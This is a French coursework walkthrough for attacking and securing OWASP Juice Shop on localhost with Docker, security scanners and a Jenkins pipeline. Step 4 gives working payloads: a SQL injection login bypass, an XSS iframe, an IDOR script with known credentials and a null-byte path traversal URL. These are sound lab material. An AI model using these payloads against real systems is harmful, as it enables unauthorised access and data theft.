# Guide étape par étape — À rendre aujourd'hui

Ordre d'exécution optimisé pour rendre le jour même. Chaque commande est prête à
copier-coller (Windows 11 / PowerShell). Prends la capture indiquée à chaque étape.

> **Plan de la journée (≈ 3 h)**
> 1. Étapes 0-3 : lancer app + Jenkins + les 4 scans → **captures 01-14** (~1 h)
> 2. Étapes 4-5 : exploiter les 5 failles → **captures 04-09** (~45 min)
> 3. Étape 6 : pipeline Jenkins + webhook → **captures 15-20, 26-27** (~45 min)
> 4. Étape 7 : montrer 2-3 remédiations → **captures 21-25** (~30 min)
> 5. Étape 8 : rapport (déjà rédigé, tu insères les captures) + vidéo

---

## Étape 0 — Préparer le dépôt

```powershell
# Cloner ton fork
git clone https://github.com/leonbathie/juice-shop.git
cd juice-shop

# Copier les fichiers du projet (Jenkinsfile, configs, remédiations, README)
# -> décompresse le dossier "project/" que je t'ai fourni à la racine du dépôt
```

Vérifie que `Jenkinsfile`, `.gitleaks.toml`, `security-config/`, `remediation/` et
`scripts/` sont bien à la racine, puis :

```powershell
git add Jenkinsfile Jenkinsfile.simple .gitleaks.toml security-config scripts remediation README.md .gitignore
git commit -m "Ajout pipeline de securite (SCA/SAST/DAST/Secrets) et documentation"
git push origin master
```

---

## Étape 1 — Lancer l'application cible

```powershell
docker pull bkimminich/juice-shop
docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop
docker ps
```

Ouvre **http://localhost:3000** dans le navigateur.

📸 **`01-docker-version.png`** (terminal : `docker --version` + `docker ps`)
📸 **`02-juiceshop-accueil.png`** (page d'accueil dans le navigateur)

---

## Étape 2 — Lancer Jenkins (Docker, plus rapide que réinstaller)

```powershell
docker run -d --name jenkins-secu -u root `
  -p 8080:8080 -p 50000:50000 `
  -v jenkins_home:/var/jenkins_home `
  -v /var/run/docker.sock:/var/run/docker.sock `
  jenkins/jenkins:lts

# Installer le client Docker DANS Jenkins (nécessaire pour les scans conteneurisés)
docker exec -u root jenkins-secu bash -c "curl -fsSL https://get.docker.com | sh"

# Mot de passe initial
docker exec jenkins-secu cat /var/jenkins_home/secrets/initialAdminPassword
```

Sur **http://localhost:8080** : déverrouille, installe les plugins suggérés, crée
l'admin, puis installe en plus : **Pipeline**, **Email Extension**, **HTML Publisher**.

📸 **`03-jenkins-dashboard.png`**

> ⏱️ Si Jenkins prend trop de temps : tu peux d'abord faire l'étape 3 (les scans en
> local) et revenir à Jenkins ensuite. Les deux sont indépendants.

---

## Étape 3 — Exécuter les 4 contrôles de sécurité (en local)

```powershell
# Depuis la racine du dépôt juice-shop
powershell -ExecutionPolicy Bypass -File .\scripts\run-all-scans.ps1
```

Le script enchaîne SCA → Secrets → SAST → DAST et remplit `reports/`.
Si tu préfères outil par outil, prends les 4 blocs du **README.md § 3.3**.

📸 **`10-sca-npm-audit.png`** (résumé npm audit : X critiques / Y élevées…)
📸 **`11-secrets-gitleaks.png`** (findings Gitleaks, secrets masqués)
📸 **`12-sast-semgrep.png`** (règles CWE déclenchées)
📸 **`13-dast-zap.png`** (ouvre `reports/dast-zap.html` dans le navigateur)
📸 **`14-arborescence-reports.png`** (`dir reports`)

> 🔎 **Note tes chiffres réels** : ouvre `reports/sca-npm-audit.txt` et relève le nombre
> exact de vulnérabilités par sévérité. Tu les reporteras dans le rapport (le tableau
> V6 est pré-rempli avec 46 vulnérabilités — remplace par tes chiffres si différents).

---

## Étape 4 — Exploiter les failles (Partie 1 du sujet)

### V1 — Injection SQL

Page de connexion → champ **e-mail** :

```
' OR 1=1--
```

Mot de passe : `x` → **Login**. Tu es connecté en **admin@juice-sh.op**.

📸 **`04-V1-sqli-payload.png`** (payload saisi)
📸 **`05-V1-sqli-admin.png`** (connecté en admin)

### V2 — XSS (DOM)

Barre de recherche (loupe en haut) → colle :

```html
<iframe src="javascript:alert('XSS-BA')">
```

📸 **`06-V2-xss-payload.png`** puis 📸 **`07-V2-xss-alerte.png`**

### V3 — Broken Access Control / IDOR

Connecte-toi normalement, ouvre DevTools (F12) → onglet **Network**, ajoute un produit
au panier pour voir ton `basket/:id`, puis rejoue en changeant l'ID :

```powershell
# Récupère un token puis teste plusieurs paniers
$body = '{"email":"jim@juice-sh.op","password":"ncc-1701"}'
$tok = (Invoke-RestMethod -Uri http://localhost:3000/rest/user/login -Method POST -ContentType "application/json" -Body $body).authentication.token
1..4 | % { try { Invoke-RestMethod -Uri "http://localhost:3000/rest/basket/$_" -Headers @{Authorization="Bearer $tok"} | Out-Null; "basket/$_ -> 200" } catch { "basket/$_ -> $($_.Exception.Response.StatusCode.value__)" } }
```

📸 **`08-V3-idor-basket.png`** (accès au panier d'un autre utilisateur)

### V4 — Exposition /ftp + path traversal

```
http://localhost:3000/ftp
http://localhost:3000/ftp/acquisitions.md
http://localhost:3000/ftp/package.json.bak%2500.md
```

📸 **`09-V4-ftp-listing.png`** (listing + document confidentiel ouvert)

### V5 — Secrets / hachage

Vient du scan Gitleaks (capture 11) : clé JWT + MD5 dans `lib/insecurity.ts`.
Aucune manipulation supplémentaire nécessaire.

---

## Étape 5 — Configurer le pipeline dans Jenkins

1. **Nouvel Item** → nom `Securite-JuiceShop` → **Pipeline** → OK
2. Section *Pipeline* → **Pipeline script from SCM** → SCM = **Git**
3. Repository URL : `https://github.com/leonbathie/juice-shop.git`, branche `*/master`
4. *Script Path* : `Jenkinsfile` (ou `Jenkinsfile.simple` si Docker inaccessible depuis Jenkins)
5. Coche **GitHub hook trigger for GITScm polling** → **Save**
6. **Build Now**

📸 **`15-jenkins-config-pipeline.png`** (la config SCM)
📸 **`16-jenkins-stage-view.png`** (les 6 étapes)
📸 **`17-jenkins-console.png`** (console output)
📸 **`18-jenkins-artifacts.png`** (artefacts `reports/**`)
📸 **`19-jenkins-gate-failure.png`** (build FAILURE = *security gate* déclenché — c'est voulu)

---

## Étape 6 — E-mail + webhook

**E-mail** : *Administrer Jenkins → Configuration du système → Extended E-mail
Notification* → `smtp.gmail.com` / port `465` / SSL / mot de passe d'application.
Relance un build.

📸 **`20-jenkins-email.png`** (mail reçu)

**Webhook** :

```powershell
ngrok http 8080
```

GitHub → *Settings → Webhooks → Add webhook* →
`https://<id>.ngrok-free.app/github-webhook/` · `application/json` · *push event*.
Fais un petit commit + push, le build démarre tout seul.

📸 **`26-github-webhook.png`** (livraison verte)
📸 **`27-jenkins-build-webhook.png`** (*Started by GitHub push by leonbathie*)

---

## Étape 7 — Montrer 2-3 remédiations (Partie 3 du sujet)

Tu n'as **pas besoin de corriger réellement le code Juice Shop**. Le dossier
`remediation/` contient déjà, pour V1 à V5 : cause, correction (code avant/après),
justification et méthode de vérification. Pour la démo/le rapport, montre le diff
« avant → après » de 2-3 failles et la vérification associée.

Vérifications rapides à filmer :

```powershell
# V1 : le payload SQLi doit renvoyer 401 une fois corrigé (démonstration du test)
curl.exe -s -o NUL -w "%{http_code}`n" -X POST http://localhost:3000/rest/user/login `
  -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
```

📸 **`21`→`25`** selon la liste des captures.

---

## Étape 8 — Rapport + vidéo

- **Rapport** : le fichier `Rapport_Securite_JuiceShop_Ousmane_BA.docx` est déjà rédigé
  (10 sections, tableaux CWE/CIA/remédiation/décision). Tu insères tes captures aux
  emplacements marqués `[CAPTURE …]`, tu vérifies tes chiffres SCA, tu exportes en PDF.
- **Vidéo** : suis `SCRIPT_VIDEO_DEMO.md` (plan minuté 5-10 min).

**Dépôt final à rendre** : `git push` du dossier `project/` complet + le PDF + le lien
de la vidéo.
